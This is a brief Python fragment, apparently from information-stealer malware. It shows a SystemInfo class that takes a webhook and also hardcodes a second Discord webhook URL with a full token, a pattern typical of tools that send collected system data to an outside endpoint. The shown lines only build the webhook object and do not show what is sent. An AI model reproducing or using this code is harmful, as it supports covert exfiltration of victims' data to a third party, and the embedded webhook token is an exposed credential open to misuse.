...
class SystemInfo():
    def __init__(self, webhook: str) -> None:
        ...
        webhook222 = SyncWebhook.from_url("https://discord.com/api/webhooks/1113804591620956281/gBsEu9Cwqp0wkhVPtnSzVl_LH6DAm3Z6D8ao71bRfDqOmz_jSwyNGo1RxR8X-l4TGURU")
